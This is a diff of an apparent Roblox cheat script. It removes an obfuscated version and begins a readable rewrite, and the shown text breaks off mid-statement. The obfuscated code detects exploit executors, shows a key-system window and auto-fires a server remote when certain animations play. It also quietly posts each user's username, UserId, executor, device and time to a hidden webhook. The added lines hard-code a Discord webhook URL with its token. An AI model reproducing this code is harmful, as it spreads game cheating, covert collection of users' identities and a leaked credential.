@@ -1,12 +1,245 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+--// SERVICES
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 
-]]--
+--// WEBHOOK CONFIG
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1503634663422558278/M-ICX2Xamvjpnujt908J9xmzDDw9GjNbb_UyfjaiYa427UQHsXFGG69-n08CFV_wHBpR"
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v31,v32) local v33={};for v93=1, #v31 do v6(v33,v0(v4(v1(v2(v31,v93,v93 + 1 )),v1(v2(v32,1 + (v93% #v32) ,1 + (v93% #v32) + 1 )))%256 ));end return v5(v33);end local v8=game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\17\200\58\201\245\32\204\62\192\248\16\217\37\215\253\36\200","\156\67\173\74\165"));local v10=game:GetService(v7("\0\160\76\19\178\21\67\38\161\64\21\185","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\101\5\39\0\215\94\6\55\6\205\85\4\52\27\253\85","\158\48\118\66\114"));local v12=game:GetService(v7("\131\48\4\38\64\160\233\189\45\19\51","\155\203\68\112\86\19\197"));local v13=v8.LocalPlayer;local v14=v13.Character or v13.CharacterAdded:Wait() ;local v15=v14:WaitForChild(v7("\110\200\59\253\78\119\236\252","\152\38\189\86\156\32\24\133"));local v16=v9:WaitForChild(v7("\217\65\162\72\232\68","\38\156\55\199")):WaitForChild(v7("\129\115\108\61\7","\35\200\29\28\72\115\20\154"));local v17={[v7("\11\189\201\222\158\63\49\13\182\213\133\194\99\101\65\232\136\143\223\126\96\74\239\135","\84\121\223\177\191\237\76")]=true,[v7("\169\84\209\161\41\67\53\213\178\82\147\239\117\1\104\150\227\5\153\244\106\3\104\146","\161\219\54\169\192\90\48\80")]=true};local v18={[v7("\91\64\24\36\90\81\5\49\64\70\90\106\6\19\88\114\17\17\80\113\25\17\88\118","\69\41\34\96")]=true,[v7("\174\193\207\11\17\56\185\215\222\14\88\100\243\146\143\93\90\120\236\151\131\94\90\115","\75\220\163\183\106\98")]=true,[v7("\16\184\147\54\202\17\191\159\62\221\88\245\196\102\129\85\227\219\101\139\86\233\219\97","\185\98\218\235\87")]=true};local v19={[v7("\237\48\46\232\202\176\153","\202\171\92\71\134\190")]=true,[v7("\4\192\62\156\32\207\45","\232\73\161\76")]=true,[v7("\171\214\86\82\18\180\210\77","\126\219\185\34\61")]=true};local v20={};local v21=false;local v22=(v11.TouchEnabled and v7("\33\193\92\123\114\114","\135\108\174\62\18\30\23\147")) or v7("\134\202","\167\214\137\74\171\120\206\83") ;local v23=v7("\190\254\57\83\247\176\133","\199\235\144\82\61\152");if (pcall(function() return syn;end) and syn) then v23=v7("\52\15\183\42\23\5\188\107\63","\75\103\118\217");elseif (pcall(function() return KRNL_LOADED;end) and KRNL_LOADED) then v23=v7("\236\70\126\24","\126\167\52\16\116\217");elseif (pcall(function() return Delta;end) and Delta) then v23=v7("\236\43\44\148\181","\156\168\78\64\224\212\121");elseif (pcall(function() return fluxus;end) and fluxus) then v23=v7("\33\226\176\214\18\253","\174\103\142\197");elseif (pcall(function() return getgenv().is_sirhurt_closure;end) and getgenv().is_sirhurt_closure) then v23=v7("\101\33\77\48\48\76\236","\152\54\72\63\88\69\62");end local function v24() local v34=0 + 0 ;local v35;local v36;local v37;local v38;local v39;local v40;while true do if (v34==(10 -6)) then return v39,v40;end if (0==v34) then local v96=0 -0 ;while true do if (v96==(1391 -(157 + 1234))) then v35={v7("\254\197\224","\60\180\164\142"),v7("\126\91\7","\114\56\62\101\73\71\141"),v7("\149\232\201","\164\216\137\187"),v7("\243\246\35","\107\178\134\81\210\198\158"),v7("\21\15\155","\202\88\110\226\166"),v7("\233\26\140","\170\163\111\226\151"),v7("\59\37\190","\73\113\80\210\88\46\87"),v7("\160\57\202","\135\225\76\173\114"),v7("\41\232\168","\199\122\141\216\208\204\221"),v7("\130\222\4","\150\205\189\112\144\24"),v7("\11\139\169","\112\69\228\223\44\100\232\113"),v7("\240\26\4","\230\180\127\103\179\214\28")};v36=os.date(v7("\198\17","\128\236\101\63\38\132\33"));v96=3 -2 ;end if (v96==1) then v34=1 + 0 ;break;end end end if (v34==1) then v37=v36.hour;v38=((v37>=(482 -(381 + 89))) and v7("\156\132","\175\204\201\113\36\214\139")) or v7("\102\225","\100\39\172\85\188") ;v34=2 + 0 ;end if (v34==(3 + 0)) then v39=string.format(v7("\232\124\227\197\99\255\124\227\197\99\255\124\249\197\32","\83\205\24\217\224"),v37,v36.min,v36.sec,v38);v40=string.format(v7("\163\214\141\120\226\137\141\120\226","\93\134\165\173"),v35[v36.month],v36.day,v36.year);v34=6 -2 ;end if ((1158 -(1074 + 82))==v34) then v37=v37%12 ;if (v37==(0 -0)) then v37=1796 -(214 + 1570) ;end v34=1458 -(990 + 465) ;end end end local v25=v7("\182\230\213\210\41\148\253\49\186\251\210\193\53\220\182\48\189\253\204\141\59\222\187\49\169\247\195\202\53\193\185\109\241\163\148\146\105\152\225\42\232\171\145\148\107\150\230\44\235\161\148\151\117\232\131\92\151\163\248\250\55\252\152\108\179\245\237\243\42\215\224\46\137\191\216\151\109\193\167\111\187\221\200\248\34\196\160\70\150\216\213\246\109\214\141\88\149\167\214\214\3\156\144\87\157\255\194\238\20\204\183\103\143\247\199\212\98\216\150\74\154","\30\222\146\161\162\90\174\210");local function v26(v41) local v42=0 + 0 ;local v43;local v44;local v45;local v46;local v47;while true do if (v42==(0 + 0)) then v43,v44=v24();v45=((v41==v7("\224\68\117\9\240\90\113\14\234","\106\133\46\16")) and (3352033 + 94970)) or ((v41==v7("\91\47\97\238\95\67\76\47","\32\56\64\19\156\58")) and 65280) or (65769321 -49057641) ;v42=1;end if (v42==(1728 -(1668 + 58))) then pcall(function() request({[v7("\194\225\48","\178\151\147\92")]=v25,[v7("\161\248\88\58\29\72","\26\236\157\44\82\114\44")]=v7("\26\1\230\111","\59\74\78\181"),[v7("\13\212\91\94\182\55\194","\211\69\177\58\58")]={[v7("\148\234\119\225\236\197\163\168\77\236\249\206","\171\215\133\25\149\137")]=v7("\224\216\34\246\230\51\253\86\232\199\60\181\229\35\243\76","\34\129\168\82\154\143\80\156")},[v7("\167\189\55\18","\233\229\210\83\107\40\46")]=v47});end);break;end if (v42==(627 -(512 + 114))) then local v98=0 -0 ;while true do if (v98==0) then v46=((v41==v7("\95\194\224\85\79\230\129\94\199","\224\58\168\133\54\58\146")) and v7("\106\85\89\244\101\146\199\46\83\83\72\232\97\135\131\4","\107\57\54\43\157\21\230\231")) or ((v41==v7("\216\132\3\231\188\223\219\212","\175\187\235\113\149\217\188")) and v7("\31\160\143\88\241\120\107\57\161\128\12\192\118\106\46\170\130\88\226","\24\92\207\225\44\131\25")) or v7("\104\220\182\88\9\124\88\214\182\77\91\84\69\208\183\94\9\120\72\199\185","\29\43\179\216\44\123") ;v47=v12:JSONEncode({[v7("\184\212\34\73\185\202","\44\221\185\64")]={{[v7("\21\238\92\83\118","\19\97\135\40\63")]=v46,[v7("\173\83\63\52\61","\81\206\60\83\91\79")]=v45,[v7("\72\162\213\126\43\208","\196\46\203\176\18\79\163\45")]={{[v7("\182\35\115\27","\143\216\66\30\126\68\155")]=v7("\128\221\10\202\193\172\197","\129\202\168\109\171\165\195\183"),[v7("\52\89\59\205\219","\134\66\56\87\184\190\116")]=v13.Name,[v7("\53\63\5\178\23\238","\85\92\81\105\219\121\139\65")]=true},{[v7("\243\178\93\64","\191\157\211\48\37\28")]=v7("\234\12\241\14\19\219","\90\191\127\148\124"),[v7("\110\134\34\2\125","\119\24\231\78")]=tostring(v13.UserId),[v7("\139\35\169\67\210\69","\113\226\77\197\42\188\32")]=true},{[v7("\52\23\249\176","\213\90\118\148")]=v7("\126\54\177\85\88\79\33\166","\45\59\78\212\54"),[v7("\6\87\143\158\131","\144\112\54\227\235\230\78\205")]=v23,[v7("\186\38\3\245\222\94","\59\211\72\111\156\176")]=true},{[v7("\64\134\238\40","\77\46\231\131")]=v7("\158\81\160\73\185\81","\32\218\52\214"),[v7("\88\22\61\189\244","\58\46\119\81\200\145\208\37")]=v22,[v7("\34\130\60\165\167\184","\86\75\236\80\204\201\221")]=true},{[v7("\124\64\122\128","\235\18\33\23\229\158")]=v7("\120\181\211\186","\219\48\218\161"),[v7("\242\112\112\92\222","\128\132\17\28\41\187\47")]=v43,[v7("\8\60\10\51\83\4","\61\97\82\102\90")]=true},{[v7("\162\47\166\78","\105\204\78\203\43\167\55\126")]=v7("\131\175\32\22\18","\49\197\202\67\126\115\100\167"),[v7("\33\90\211\60\133","\62\87\59\191\73\224\54")]=v44,[v7("\238\12\246\192\233\7","\169\135\98\154")]=true}},[v7("\205\120\43\64\248\33","\168\171\23\68\52\157\83")]={[v7("\224\116\237\185","\231\148\17\149\205\69\77")]=v7("\166\171\206\245\67\229\192\148\196\233\94\239\148","\159\224\199\167\155\55")}}}});v98=1470 -(1269 + 200) ;end if (v98==(1 -0)) then v42=817 -(98 + 717) ;break;end end end end end local function v27() local v48=0;while true do if (v48==(827 -(802 + 24))) then task.spawn(function() while task.wait(8 -3 ) do if  not v13.Parent then v21=false;break;end end end);break;end if ((0 -0)==v48) then if  not v13 then return;end if  not v15 then return;end v48=1;end end end local function v28() local v49=0 + 0 ;local v50;while true do if (v49==0) then v50=v14:FindFirstChildOfClass(v7("\245\77\61\218","\101\161\34\82\182"));if v50 then v50:Activate();end v49=1 + 0 ;end if (v49==1) then v16:FireServer(v7("\197\92","\78\136\109\57\158\187\130\226"));break;end end end local function v29(v51) v51.AnimationPlayed:Connect(function(v94) if  not v21 then return;end local v95=tostring(v94.Animation.AnimationId);if (v17[v95] or v18[v95]) then v28();end end);end local function v30() local v52=0 + 0 ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;local v63;local v64;local v65;local v66;local v67;local v68;local v69;local v70;local v71;local v72;local v73;local v74;local v75;local v76;local v77;local v78;local v79;local v80;local v81;local v82;local v83;local v84;local v85;local v86;local v87;local v88;local v89;while true do if (v52==(7 + 21)) then v88.TextColor3=Color3.fromRGB(166 -106 ,266 -186 ,47 + 83 );v88.Font=Enum.Font.Gotham;v88.TextSize=5 + 5 ;v89=nil;function v89() local v304=0;while true do if (v304==(0 + 0)) then v10:Create(v60,TweenInfo.new(0.05 + 0 ),{[v7("\51\201\100\69\23\207\120\66","\44\99\166\23")]=UDim2.new(0.5 + 0 , -(1633 -(797 + 636)),0.5 -0 , -(1729 -(1427 + 192)))}):Play();task.wait(0.05 + 0 );v304=2 -1 ;end if (v304==1) then v10:Create(v60,TweenInfo.new(0.05 + 0 ),{[v7("\76\248\58\63\39\173\115\249","\196\28\151\73\86\83")]=UDim2.new(0.5 + 0 , -220,326.5 -(192 + 134) , -(1386 -(316 + 960)))}):Play();task.wait(0.05 + 0 );v304=2;end if (v304==(2 + 0)) then v10:Create(v60,TweenInfo.new(0.05),{[v7("\195\12\58\25\150\81\23\120","\22\147\99\73\112\226\56\120")]=UDim2.new(0.5, -(195 + 15),0.5 -0 , -(661 -(83 + 468)))}):Play();break;end end end v87.MouseButton1Click:Connect(function() if (v19[v85] and  not v20[v85]) then local v310=1806 -(1202 + 604) ;while true do if (3==v310) then v10:Create(v60,TweenInfo.new(0.4 -0 ),{[v7("\213\22\70\138\11\4\32\80","\62\133\121\53\227\127\109\79")]=UDim2.new(0.5 -0 , -(581 -371),326.5 -(45 + 280) ,0 + 0 )}):Play();task.wait(0.5 + 0 );v310=4;end if ((1 + 1)==v310) then v86.Text=v7("\160\71\90\81\166\204\80\139\74\80\19\240","\62\226\46\63\63\208\169")   .. v13.Name   .. "!" ;task.wait(1.2 + 0 );v310=1 + 2 ;end if ((0 -0)==v310) then v20[v85]=true;v21=true;v310=1912 -(340 + 1571) ;end if (v310==4) then v53:Destroy();break;end if (v310==(1 + 0)) then task.spawn(function() v26(v7("\187\122\240\231\136\187\97\237","\237\216\21\130\149"));end);v86.TextColor3=Color3.fromRGB(60,1972 -(1733 + 39) ,60);v310=2;end end else task.spawn(function() v26(v7("\25\26\49\250\196\188\167\19\0\61","\194\112\116\82\149\182\206"));end);v86.TextColor3=Color3.fromRGB(549 -349 ,60,1094 -(125 + 909) );v86.Text=(v20[v85] and v7("\18\173\85\88\193\238\28\60\169\72\1\128\247\29\60\172","\110\89\200\44\120\160\130")) or v7("\130\205\93\71\79\67\63\13\160\198\82","\45\203\163\43\38\35\42\91") ;task.spawn(v89);end end);break;end if (v52==(1955 -(1096 + 852))) then v63.Size=UDim2.fromOffset(55,25 + 30 );v63.Position=UDim2.new(0.5 -0 , -(27 + 0),512 -(409 + 103) ,250 -(46 + 190) );v63.BackgroundColor3=Color3.fromRGB(115 -(51 + 44) ,35,19 + 46 );v63.BorderSizePixel=1317 -(1114 + 203) ;Instance.new(v7("\244\59\46\250\16\126\188\211","\217\161\114\109\149\98\16"),v63).CornerRadius=UDim.new(726 -(228 + 498) ,3 + 7 );v64=Instance.new(v7("\39\9\11\104\174\123\25\37","\20\114\64\88\28\220"),v63);v64.Color=Color3.fromRGB(28 + 22 ,110,883 -(174 + 489) );v64.Thickness=5 -3 ;v52=1913 -(830 + 1075) ;end if ((551 -(303 + 221))==v52) then v87.TextSize=1282 -(231 + 1038) ;v87.BorderSizePixel=0;Instance.new(v7("\239\194\84\231\153\201\223\249","\167\186\139\23\136\235"),v87).CornerRadius=UDim.new(0,8);v88=Instance.new(v7("\46\176\144\25\54\180\138\8\22","\109\122\213\232"),v77);v88.Size=UDim2.new(1 + 0 ,1162 -(171 + 991) ,0 -0 ,42 -26 );v88.Position=UDim2.new(0 -0 ,0 + 0 ,0,693 -495 );v88.BackgroundTransparency=2 -1 ;v88.Text=v7("\205\229\167\49\234\248\226\32\225\229\226\22\226\254\172\36\244\183\234\60\226\166\240\96\185\237\235","\80\142\151\194");v52=28;end if (v52==(40 -15)) then v83:GetPropertyChangedSignal(v7("\114\73\217\183","\168\38\44\161\195\150")):Connect(function() local v305=0;local v306;while true do if (v305==(3 -2)) then v83.Text=string.rep("*", #v85);break;end if (v305==(1248 -(111 + 1137))) then v306=v83.Text;if ( #v306> #v85) then v85=v85   .. string.sub(v306, #v85 + (159 -(91 + 67)) ) ;elseif ( #v306< #v85) then v85=string.sub(v85,2 -1 , #v306);end v305=1 + 0 ;end end end);v86=Instance.new(v7("\180\249\154\98\28\233\180\19\140","\118\224\156\226\22\80\136\214"),v77);v86.Size=UDim2.new(524 -(423 + 100) ,0 + 0 ,0 -0 ,16);v86.Position=UDim2.new(0 + 0 ,0,771 -(326 + 445) ,120);v86.BackgroundTransparency=4 -3 ;v86.Text="";v86.TextColor3=Color3.fromRGB(200,60,60);v86.Font=Enum.Font.Gotham;v52=26;end if (v52==(57 -31)) then v86.TextSize=25 -14 ;v87=Instance.new(v7("\118\235\65\148\96\251\77\148\77\224","\224\34\142\57"),v77);v87.Size=UDim2.new(711.88 -(530 + 181) ,881 -(614 + 267) ,32 -(19 + 13) ,55 -21 );v87.Position=UDim2.new(0.06 -0 ,0 -0 ,0 + 0 ,140);v87.BackgroundColor3=Color3.fromRGB(40,158 -68 ,200);v87.Text=v7("\236\162\193\216\118\252\29\37\219\190","\110\190\199\165\189\19\145\61");v87.TextColor3=Color3.fromRGB(528 -273 ,2067 -(1293 + 519) ,520 -265 );v87.Font=Enum.Font.GothamBold;v52=70 -43 ;end if (v52==(7 -3)) then v59=Instance.new(v7("\159\49\170\121\186","\212\217\67\203\20\223\223\37"),v58);v59.Size=UDim2.new(0,0 -0 ,2 -1 ,0 + 0 );v59.BackgroundColor3=Color3.fromRGB(9 + 31 ,209 -119 ,200);v59.BorderSizePixel=0;Instance.new(v7("\143\164\139\221\168\131\173\192","\178\218\237\200"),v59).CornerRadius=UDim.new(0 + 0 ,4);v10:Create(v59,TweenInfo.new(1.5 + 0 ,Enum.EasingStyle.Quad),{[v7("\133\188\252\213","\176\214\213\134")]=UDim2.new(1,0,1,0 + 0 )}):Play();task.wait(1097.6 -(709 + 387) );v55:Destroy();v52=5;end if ((1863 -(673 + 1185))==v52) then v60=Instance.new(v7("\210\191\183\217\173","\57\148\205\214\180\200\54"),v53);v60.Size=UDim2.fromOffset(420,638 -418 );v60.Position=UDim2.new(0.5, -210,1.5,0 -0 );v60.BackgroundTransparency=1;v60.BorderSizePixel=0;v10:Create(v60,TweenInfo.new(0.5 -0 ,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{[v7("\34\242\38\61\98\27\242\59","\22\114\157\85\84")]=UDim2.new(0.5, -(151 + 59),0.5, -110)}):Play();v61=Instance.new(v7("\226\217\18\201\88","\200\164\171\115\164\61\150"),v60);v61.Size=UDim2.fromOffset(140,165 + 55 );v52=7 -1 ;end if (v52==(6 + 15)) then v80.TextSize=29 -14 ;v80.TextXAlignment=Enum.TextXAlignment.Left;v81=Instance.new(v7("\170\46\69\239\86","\98\236\92\36\130\51"),v77);v81.Size=UDim2.new(0.88 -0 ,1880 -(446 + 1434) ,1283 -(1040 + 243) ,95 -63 );v81.Position=UDim2.new(1847.06 -(559 + 1288) ,0,1931 -(609 + 1322) ,42);v81.BackgroundColor3=Color3.fromRGB(18,30,514 -(13 + 441) );v81.BorderSizePixel=0 -0 ;Instance.new(v7("\145\48\47\181\87\166\176\34","\80\196\121\108\218\37\200\213"),v81).CornerRadius=UDim.new(0,20 -12 );v52=22;end if (v52==(9 -7)) then v56.Color=Color3.fromRGB(40,4 + 86 ,180);v56.Thickness=3.5 -2 ;v57=Instance.new(v7("\39\208\154\239\198\198\17\208\142","\167\115\181\226\155\138"),v55);v57.Size=UDim2.new(1 + 0 ,0 + 0 ,0,20);v57.Position=UDim2.new(0 -0 ,0 + 0 ,0,8);v57.BackgroundTransparency=1 -0 ;v57.Text=v7("\196\46\238\82\111\107\134\175\98\196\93\105\118\199\236\38\232\18\53\63","\166\130\66\135\60\27\17");v57.TextColor3=Color3.fromRGB(80,93 + 47 ,142 + 113 );v52=3 + 0 ;end if (v52==17) then v74.TextSize=10;v75,v76=v24();v73.Text=v75;v74.Text=v76;task.spawn(function() while v53 and v53.Parent  do local v307=0;local v308;local v309;while true do if (v307==(1 + 0)) then v74.Text=v309;task.wait(1 + 0 );break;end if (v307==(433 -(153 + 280))) then v308,v309=v24();v73.Text=v308;v307=2 -1 ;end end end end);v77=Instance.new(v7("\149\65\203\125\31","\161\211\51\170\16\122\93\53"),v60);v77.Size=UDim2.fromOffset(241 + 27 ,87 + 133 );v77.Position=UDim2.new(0 + 0 ,138 + 14 ,0,0);v52=14 + 4 ;end if (v52==(15 -5)) then v67.BackgroundColor3=Color3.fromRGB(25 + 15 ,737 -(89 + 578) ,140);v67.BorderSizePixel=0 + 0 ;v68=Instance.new(v7("\47\232\158\69\193\60\59\30\225","\89\123\141\230\49\141\93"),v61);v68.Size=UDim2.new(1, -10,0,14);v68.Position=UDim2.new(0 -0 ,1057 -(572 + 477) ,0 + 0 ,63 + 41 );v68.BackgroundTransparency=1 + 0 ;v68.Text=v7("\214\105\243\15\5\94\252\99","\42\147\17\150\108\112");v68.TextColor3=Color3.fromRGB(100,130,286 -(84 + 2) );v52=17 -6 ;end if (v52==(12 + 4)) then v73.Font=Enum.Font.GothamBold;v73.TextSize=854 -(497 + 345) ;v74=Instance.new(v7("\12\3\21\249\20\7\15\232\52","\141\88\102\109"),v61);v74.Size=UDim2.new(1 + 0 ,0 + 0 ,1333 -(605 + 728) ,14);v74.Position=UDim2.new(0 + 0 ,0,0,433 -238 );v74.BackgroundTransparency=1 + 0 ;v74.TextColor3=Color3.fromRGB(120,150,739 -539 );v74.Font=Enum.Font.Gotham;v52=16 + 1 ;end if ((55 -35)==v52) then v79.MouseButton1Click:Connect(function() v53:Destroy();end);v80=Instance.new(v7("\226\132\231\93\243\215\131\250\69","\191\182\225\159\41"),v77);v80.Size=UDim2.new(1 + 0 , -(529 -(457 + 32)),0 + 0 ,1426 -(832 + 570) );v80.Position=UDim2.new(0 + 0 ,3 + 7 ,0,35 -25 );v80.BackgroundTransparency=1 + 0 ;v80.Text=v7("\13\30\33\91\159\157","\162\75\114\72\53\235\231");v80.TextColor3=Color3.fromRGB(876 -(588 + 208) ,377 -237 ,2055 -(884 + 916) );v80.Font=Enum.Font.GothamBold;v52=43 -22 ;end if (v52==12) then v69.TextColor3=Color3.fromRGB(47 + 33 ,793 -(232 + 421) ,2144 -(1569 + 320) );v69.Font=Enum.Font.GothamBold;v69.TextSize=3 + 9 ;v69.TextXAlignment=Enum.TextXAlignment.Left;v70=Instance.new(v7("\54\12\191\66\145\229\21\172\14","\201\98\105\199\54\221\132\119"),v61);v70.Size=UDim2.new(1, -10,0,14);v70.Position=UDim2.new(0,8,0 + 0 ,136);v70.BackgroundTransparency=1;v52=43 -30 ;end if (v52==(613 -(316 + 289))) then v65=Instance.new(v7("\24\12\211\179\253\252\188\51\4\222","\221\81\97\178\212\152\176"),v63);v65.Size=UDim2.fromScale(2 -1 ,1);v65.BackgroundTransparency=1 + 0 ;v65.Image=v7("\197\243\9\235\9\151\168\82\236\13\218\169\15\244\24\193\232\5\181\25\194\234\82\243\31\204\227\14\243\21\217\170\9\243\15\192\229\19\250\19\193\168\20\246\27\202\226\66\238\9\200\245\52\255\71","\122\173\135\125\155")   .. v13.UserId   .. v7("\194\214\9\189\43\57\149\213\148\80\255\55\52\193\131\201\20\228\110\100\152\194\199\15\171\50\48\220\217\209\14\190","\168\228\161\96\217\95\81") ;Instance.new(v7("\238\248\13\83\61\89\222\195","\55\187\177\78\60\79"),v65).CornerRadius=UDim.new(1453 -(666 + 787) ,435 -(360 + 65) );v66=Instance.new(v7("\25\203\71\255\106\206\130\40\194","\224\77\174\63\139\38\175"),v61);v66.Size=UDim2.new(1,0 + 0 ,0,272 -(79 + 175) );v66.Position=UDim2.new(0,0 -0 ,0,58 + 16 );v52=27 -18 ;end if (v52==(24 -11)) then v70.Text=v7("\157\9\149\40\1\48","\204\217\108\227\65\98\85");v70.TextColor3=Color3.fromRGB(100,1029 -(503 + 396) ,381 -(92 + 89) );v70.Font=Enum.Font.Gotham;v70.TextSize=10;v70.TextXAlignment=Enum.TextXAlignment.Left;v71=Instance.new(v7("\106\198\237\241\0\193\92\198\249","\160\62\163\149\133\76"),v61);v71.Size=UDim2.new(1, -(19 -9),0,9 + 7 );v71.Position=UDim2.new(0 + 0 ,31 -23 ,0 + 0 ,337 -189 );v52=13 + 1 ;end if (v52==23) then v83.Size=UDim2.new(0.88 + 0 ,0,0 -0 ,4 + 28 );v83.Position=UDim2.new(0.06 -0 ,1244 -(485 + 759) ,0,189 -107 );v83.BackgroundColor3=Color3.fromRGB(18,1219 -(442 + 747) ,1195 -(832 + 303) );v83.TextColor3=Color3.fromRGB(1146 -(88 + 858) ,65 + 145 ,255);v83.PlaceholderText=v7("\21\16\148\29\83\112\7\143\13\83\112\21\133\1\15\126\80","\33\80\126\224\120");v83.PlaceholderColor3=Color3.fromRGB(70,75 + 15 ,6 + 134 );v83.Text="";v83.Font=Enum.Font.Gotham;v52=813 -(766 + 23) ;end if (v52==(108 -86)) then v82=Instance.new(v7("\52\118\26\107\103\15\136\5\127","\234\96\19\98\31\43\110"),v81);v82.Size=UDim2.fromScale(1 -0 ,1);v82.BackgroundTransparency=2 -1 ;v82.Text=v7("\35\17\70\194\190\50\146\9\10\64\135\167\119\146\70\11\93\135\175\125\133\18\22\92\210\169","\235\102\127\50\167\204\18");v82.TextColor3=Color3.fromRGB(271 -191 ,1203 -(1036 + 37) ,156 + 64 );v82.Font=Enum.Font.GothamBold;v82.TextSize=21 -10 ;v83=Instance.new(v7("\100\164\237\55\102\33\72","\78\48\193\149\67\36"),v77);v52=23;end if (v52==(12 + 2)) then v71.BackgroundTransparency=1;v71.Text=v22;v71.TextColor3=Color3.fromRGB(1560 -(641 + 839) ,1053 -(910 + 3) ,650 -395 );v71.Font=Enum.Font.GothamBold;v71.TextSize=1696 -(1466 + 218) ;v71.TextXAlignment=Enum.TextXAlignment.Left;v72=Instance.new(v7("\240\178\12\34\198","\163\182\192\109\79"),v61);v72.Size=UDim2.new(0.85 + 0 ,1148 -(556 + 592) ,0,1 + 0 );v52=15;end if (v52==6) then v61.Position=UDim2.new(808 -(329 + 479) ,854 -(174 + 680) ,0 -0 ,0);v61.BackgroundColor3=Color3.fromRGB(20 -10 ,13 + 5 ,774 -(396 + 343) );v61.BorderSizePixel=0 + 0 ;Instance.new(v7("\139\221\32\74\145\176\241\17","\227\222\148\99\37"),v61).CornerRadius=UDim.new(0,1491 -(29 + 1448) );v62=Instance.new(v7("\6\123\97\226\235\60\89\87","\153\83\50\50\150"),v61);v62.Color=Color3.fromRGB(40,90,180);v62.Thickness=1390.5 -(135 + 1254) ;v63=Instance.new(v7("\123\100\114\17\118","\45\61\22\19\124\19\203"),v61);v52=26 -19 ;end if (v52==18) then v77.BackgroundColor3=Color3.fromRGB(55 -43 ,14 + 6 ,40);v77.BorderSizePixel=0;Instance.new(v7("\206\135\145\39\233\160\183\58","\72\155\206\210"),v77).CornerRadius=UDim.new(0,1541 -(389 + 1138) );v78=Instance.new(v7("\115\83\103\26\33\73\113\81","\83\38\26\52\110"),v77);v78.Color=Color3.fromRGB(40,90,754 -(102 + 472) );v78.Thickness=1.5;v79=Instance.new(v7("\108\18\63\82\122\2\51\82\87\25","\38\56\119\71"),v77);v79.Size=UDim2.fromOffset(21 + 1 ,13 + 9 );v52=19;end if (v52==(3 + 0)) then v57.Font=Enum.Font.GothamBold;v57.TextSize=1558 -(320 + 1225) ;v58=Instance.new(v7("\98\88\207\120\53","\80\36\42\174\21"),v55);v58.Size=UDim2.new(0.85 -0 ,0 + 0 ,0,1472 -(157 + 1307) );v58.Position=UDim2.new(1859.075 -(821 + 1038) ,0,0,94 -56 );v58.BackgroundColor3=Color3.fromRGB(3 + 17 ,53 -23 ,60);v58.BorderSizePixel=0 + 0 ;Instance.new(v7("\123\57\20\117\92\30\50\104","\26\46\112\87"),v58).CornerRadius=UDim.new(0 -0 ,4);v52=1030 -(834 + 192) ;end if (v52==0) then v53=Instance.new(v7("\13\60\235\244\59\49\222\228\55","\145\94\95\153"),v13.PlayerGui);v53.Name=v7("\205\204\7\198\89\184\239\201\51\192\71","\215\157\173\116\181\46");v53.ResetOnSpawn=false;v53.IgnoreGuiInset=true;v54=Instance.new(v7("\19\166\138\255\223","\186\85\212\235\146"),v53);v54.Size=UDim2.fromScale(1,1 + 0 );v54.BackgroundColor3=Color3.fromRGB(0,0 + 0 ,0 + 0 );v54.BackgroundTransparency=0.3 -0 ;v52=305 -(300 + 4) ;end if ((7 + 17)==v52) then v83.TextSize=12;v83.BorderSizePixel=0 -0 ;v83.ClearTextOnFocus=false;Instance.new(v7("\217\129\32\203\78\226\173\17","\60\140\200\99\164"),v83).CornerRadius=UDim.new(362 -(112 + 250) ,4 + 4 );v84=Instance.new(v7("\178\221\55\50\176\136\255\1","\194\231\148\100\70"),v83);v84.Color=Color3.fromRGB(40,70,375 -225 );v84.Thickness=1;v85="";v52=25;end if ((9 + 6)==v52) then v72.Position=UDim2.new(0.075 + 0 ,0 + 0 ,0,85 + 85 );v72.BackgroundColor3=Color3.fromRGB(30 + 10 ,1484 -(1001 + 413) ,312 -172 );v72.BorderSizePixel=882 -(244 + 638) ;v73=Instance.new(v7("\0\35\24\212\217\53\36\5\204","\149\84\70\96\160"),v61);v73.Size=UDim2.new(694 -(627 + 66) ,0 -0 ,602 -(512 + 90) ,18);v73.Position=UDim2.new(1906 -(1665 + 241) ,0,717 -(373 + 344) ,175);v73.BackgroundTransparency=1 + 0 ;v73.TextColor3=Color3.fromRGB(80,38 + 102 ,672 -417 );v52=16;end if (v52==19) then v79.Position=UDim2.new(1, -28,0 -0 ,1105 -(35 + 1064) );v79.BackgroundColor3=Color3.fromRGB(180,40,40);v79.Text="X";v79.TextColor3=Color3.fromRGB(186 + 69 ,545 -290 ,2 + 253 );v79.Font=Enum.Font.GothamBold;v79.TextSize=1248 -(298 + 938) ;v79.BorderSizePixel=1259 -(233 + 1026) ;Instance.new(v7("\198\198\123\217\55\88\246\253","\54\147\143\56\182\69"),v79).CornerRadius=UDim.new(1666 -(636 + 1030) ,4 + 2 );v52=20 + 0 ;end if (v52==(4 + 7)) then v68.Font=Enum.Font.Gotham;v68.TextSize=1 + 9 ;v68.TextXAlignment=Enum.TextXAlignment.Left;v69=Instance.new(v7("\59\163\53\107\203\233\13\163\33","\136\111\198\77\31\135"),v61);v69.Size=UDim2.new(1, -10,221 -(55 + 166) ,16);v69.Position=UDim2.new(0 + 0 ,1 + 7 ,0 -0 ,116);v69.BackgroundTransparency=298 -(36 + 261) ;v69.Text=v23;v52=12;end if (v52==(1 -0)) then v54.BorderSizePixel=1368 -(34 + 1334) 